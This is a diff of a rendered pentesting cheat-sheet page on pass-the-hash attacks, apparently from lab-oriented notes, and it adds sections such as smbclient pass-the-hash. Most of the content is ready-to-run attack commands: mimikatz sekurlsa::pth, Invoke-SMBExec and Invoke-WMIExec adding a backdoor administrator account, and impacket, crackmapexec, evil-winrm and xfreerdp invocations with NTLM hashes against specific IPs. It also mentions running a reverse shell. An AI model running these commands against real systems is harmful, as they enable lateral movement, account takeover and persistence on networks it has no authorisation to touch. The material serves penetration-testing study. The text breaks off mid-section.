@@ -24846,6 +24846,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#pass-the-hash-with-smbclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Hash with SMBclient
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#pass-the-hash-with-powershell-invoke-thehash-windows" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -24972,6 +24983,17 @@
     <span class="md-ellipsis">
       
         Pass the Hash with RDP (Linux)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-to-a-different-machine-ntlm-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass-the-hash to a different machine: NTLM relay attack
       
     </span>
   </a>
@@ -27056,6 +27078,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#pass-the-hash-with-smbclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Hash with SMBclient
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#pass-the-hash-with-powershell-invoke-thehash-windows" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -27182,6 +27215,17 @@
     <span class="md-ellipsis">
       
         Pass the Hash with RDP (Linux)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pass-the-hash-to-a-different-machine-ntlm-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass-the-hash to a different machine: NTLM relay attack
       
     </span>
   </a>
@@ -28253,6 +28297,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#pass-the-hash-with-smbclient" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass the Hash with SMBclient
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#pass-the-hash-with-powershell-invoke-thehash-windows" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -28386,6 +28441,17 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#pass-the-hash-to-a-different-machine-ntlm-relay-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pass-the-hash to a different machine: NTLM relay attack
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#uac-limits-pass-the-hash-for-local-accounts" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -28502,118 +28568,160 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
 <span class="normal"><a href="#__codelineno-0-10">10</a></span>
 <span class="normal"><a href="#__codelineno-0-11">11</a></span>
-<span class="normal"><a href="#__codelineno-0-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c"># Pass The Hash attack in windows:</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="c"># 1. Run mimikatz</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:&lt;username&gt; /rc4:&lt;NTLM hash&gt; /domain:&lt;DOMAIN&gt; /run:&lt;Command&gt;&quot;</span> <span class="n">exit</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="c"># sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user&#39;s password</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="c"># /user: the user we want to impersonate</span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="c"># /rc4:&lt;NTLM hash&gt;: /rc4 or /NTLM - NTLM hash of the user&#39;s password.</span>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="c"># /run:&lt;Command&gt;: For example /run:cmd.exe</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="c"># 2. After that, we can use cmd.exe to execute commands in the user&#39;s context. </span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="c"># Example:</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="c"># .\mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe&quot; exit</span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c"># Pass The Hash attack in windows:</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="c"># 1. Run mimikatz</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="n">privilege</span><span class="p">::</span><span class="n">debug</span> <span class="s2">&quot;sekurlsa::pth /user:&lt;username&gt; /rc4:&lt;NTLM hash&gt; /domain:&lt;DOMAIN&gt; /run:&lt;Command&gt;&quot;</span> <span class="n">exit</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="c"># sekurlsa::pth is a module that allows us to perform a Pass the Hash attack by starting a process using the hash of the user&#39;s password</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="c"># /user: the user we want to impersonate</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="c"># /rc4:&lt;NTLM hash&gt;: /rc4 or /NTLM - NTLM hash of the user&#39;s password.</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="c"># /run:&lt;Command&gt;: For example /run:cmd.exe</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="c"># 2. After that, we can use cmd.exe to execute commands in the user&#39;s context. </span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a><span class="c"># Example:</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="c"># .\mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe&quot; exit</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="pass-the-hash-with-smbclient">Pass the Hash with SMBclient</h2>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>smbclient<span class="w"> </span><span class="se">\\\\</span><span class="m">192</span>.168.50.212<span class="se">\\</span>secrets<span class="w"> </span>-U<span class="w"> </span>Administrator<span class="w"> </span>--pw-nt-hash<span class="w"> </span>7a38310ea6f0027ee955abed1762964b
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-powershell-invoke-thehash-windows">Pass the Hash with PowerShell Invoke-TheHash (Windows)</h2>
 <p><a href="../invoke-the-hash/">See Powershell Invoke-TheHash</a>. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. </p>
 <p>Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer.</p>
 <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution.</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span>
-<span class="normal"><a href="#__codelineno-1-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="nb">Invoke-TheHash</span><span class="p">\</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
-</span></code></pre></div></td></tr></table></div>
-<h3 id="invoke-thehash-with-smb">Invoke-TheHash with SMB</h3>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
 <span class="normal"><a href="#__codelineno-2-2">2</a></span>
-<span class="normal"><a href="#__codelineno-2-3">3</a></span>
-<span class="normal"><a href="#__codelineno-2-4">4</a></span>
-<span class="normal"><a href="#__codelineno-2-5">5</a></span>
-<span class="normal"><a href="#__codelineno-2-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="nv">$ip</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span> <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="n">-Verbose</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c"># Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c"># we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="c"># Example:</span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="c"># Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot; -Verbose</span>
+<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="nb">Invoke-TheHash</span><span class="p">\</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
 </span></code></pre></div></td></tr></table></div>
-<p><a href="../reverse-shells/">How to generate a reverse shell</a>.</p>
-<h3 id="invoke-thehash-with-wmi">Invoke-TheHash with WMI</h3>
+<h3 id="invoke-thehash-with-smb">Invoke-TheHash with SMB</h3>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
 <span class="normal"><a href="#__codelineno-3-2">2</a></span>
 <span class="normal"><a href="#__codelineno-3-3">3</a></span>
 <span class="normal"><a href="#__codelineno-3-4">4</a></span>
 <span class="normal"><a href="#__codelineno-3-5">5</a></span>
-<span class="normal"><a href="#__codelineno-3-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="nb">Invoke-WMIExec</span> <span class="n">-Target</span> <span class="nv">$machineName</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span>  <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> 
+<span class="normal"><a href="#__codelineno-3-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="nv">$ip</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span> <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> <span class="n">-Verbose</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="c"># Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="c"># we can execute `Invoke-TheHash` to execute our PowerShell reverse shell script in the target computer.</span>
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4"></a>
 </span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="c"># Example:</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="c"># Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot; -Verbose</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6"></a><span class="c"># Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot; -Verbose</span>
+</span></code></pre></div></td></tr></table></div>
+<p><a href="../reverse-shells/">How to generate a reverse shell</a>.</p>
+<h3 id="invoke-thehash-with-wmi">Invoke-TheHash with WMI</h3>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span>
+<span class="normal"><a href="#__codelineno-4-4">4</a></span>
+<span class="normal"><a href="#__codelineno-4-5">5</a></span>
+<span class="normal"><a href="#__codelineno-4-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a><span class="nb">Invoke-WMIExec</span> <span class="n">-Target</span> <span class="nv">$machineName</span> <span class="n">-Domain</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span> <span class="n">-Username</span> <span class="p">&lt;</span><span class="n">USERNAME</span><span class="p">&gt;</span> <span class="n">-Hash</span> <span class="n">64F12CDDAA88057E06A81B54E73B949B</span> <span class="n">-Command</span>  <span class="s2">&quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot;</span> 
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="c"># Example:</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="c"># Invoke-WMIExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command &quot;net user mark Password123 /add &amp;&amp; net localgroup administrators mark /add&quot; -Verbose</span>
 </span></code></pre></div></td></tr></table></div>
 <p><a href="../reverse-shells/">How to generate a reverse shell</a>.</p>
 <h2 id="pass-the-hash-with-impacket-linux">Pass the Hash with Impacket (Linux)</h2>
 <h3 id="pass-the-hash-with-impacket-psexec">Pass the Hash with Impacket PsExec</h3>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>impacket-psexec<span class="w"> </span>&lt;username&gt;@<span class="nv">$ip</span><span class="w"> </span>-hashes<span class="w"> </span>:30B3783CE2ABF1AF70F77D0660CF3453
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span>
+<span class="normal"><a href="#__codelineno-5-2">2</a></span>
+<span class="normal"><a href="#__codelineno-5-3">3</a></span>
+<span class="normal"><a href="#__codelineno-5-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>impacket-psexec<span class="w"> </span>&lt;username&gt;@<span class="nv">$ip</span><span class="w"> </span>-hashes<span class="w"> </span>:30B3783CE2ABF1AF70F77D0660CF3453
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>impacket-psexec<span class="w"> </span>-hashes<span class="w"> </span><span class="m">00000000000000000000000000000000</span>:7a38310ea6f0027ee955abed1762964b<span class="w"> </span>Administrator@192.168.50.212
 </span></code></pre></div></td></tr></table></div>
 <h3 id="pass-the-hash-with-impacket-wmiexec">Pass the Hash with impacket-wmiexec</h3>
 <p>Download from: <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py">https://github.com/fortra/impacket/blob/master/examples/wmiexec.py</a>.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="go">impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
+<span class="normal"><a href="#__codelineno-6-2">2</a></span>
+<span class="normal"><a href="#__codelineno-6-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="go">impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="go">impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="pass-the-hash-with-impacket-atexec">Pass the Hash with  impacket-atexec</h3>
 <p>Download from:  <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py</a></p>
 <h3 id="pass-the-hash-with-impacket-smbexec">Pass the Hash with  impacket-smbexec</h3>
 <p>Download from: <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py</a></p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span>
-<span class="normal"><a href="#__codelineno-6-2">2</a></span>
-<span class="normal"><a href="#__codelineno-6-3">3</a></span>
-<span class="normal"><a href="#__codelineno-6-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLMhash</span><span class="w"> </span>Administrator@&lt;TARGET-IP&gt;
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:bac9dc5b7b4bec1d83e0e9c04b477f26<span class="w"> </span>Administrator@10.129.138.81
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLMhash</span><span class="w"> </span>Administrator@&lt;TARGET-IP&gt;
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="c1"># Example:</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a>python3<span class="w"> </span>smbexec.py<span class="w"> </span>-hashes<span class="w"> </span>:bac9dc5b7b4bec1d83e0e9c04b477f26<span class="w"> </span>Administrator@10.129.138.81
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-crackmapexec-linux">Pass the Hash with CrackMapExec (Linux)</h2>
 <p>See <a href="../crackmapexec/">CrackMapExec</a></p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
-<span class="normal"><a href="#__codelineno-7-2">2</a></span>
-<span class="normal"><a href="#__codelineno-7-3">3</a></span>
-<span class="normal"><a href="#__codelineno-7-4">4</a></span>
-<span class="normal"><a href="#__codelineno-7-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="c"># Using a hash instead of a password, to authenticate ourselves</span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="c"># Execute commands with flag -x</span>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">Administrator</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">.</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-x</span> <span class="n">whoami</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span>
+<span class="normal"><a href="#__codelineno-8-2">2</a></span>
+<span class="normal"><a href="#__codelineno-8-3">3</a></span>
+<span class="normal"><a href="#__codelineno-8-4">4</a></span>
+<span class="normal"><a href="#__codelineno-8-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="c"># Using a hash instead of a password, to authenticate ourselves</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">DOMAIN</span><span class="p">&gt;</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a><span class="c"># Execute commands with flag -x</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span><span class="p">/</span><span class="n">24</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">Administrator</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">.</span> <span class="n">-H</span> <span class="p">&lt;</span><span class="n">hash</span><span class="p">&gt;</span> <span class="n">-x</span> <span class="n">whoami</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-evil-winrm-linux">Pass the Hash with evil-winrm (Linux)</h2>
 <p>See <a href="../evil-winrm/">evil-winrm</a>.</p>
 <p>If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;hash&gt;
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;<span class="w"> </span>-H<span class="w"> </span>&lt;hash&gt;
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-hash-with-rdp-linux">Pass the Hash with RDP (Linux)</h2>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
-<span class="normal"><a href="#__codelineno-9-2">2</a></span>
-<span class="normal"><a href="#__codelineno-9-3">3</a></span>
-<span class="normal"><a href="#__codelineno-9-4">4</a></span>
-<span class="normal"><a href="#__codelineno-9-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="c1"># /pth:&lt;hash&gt;   Pass the hash</span>
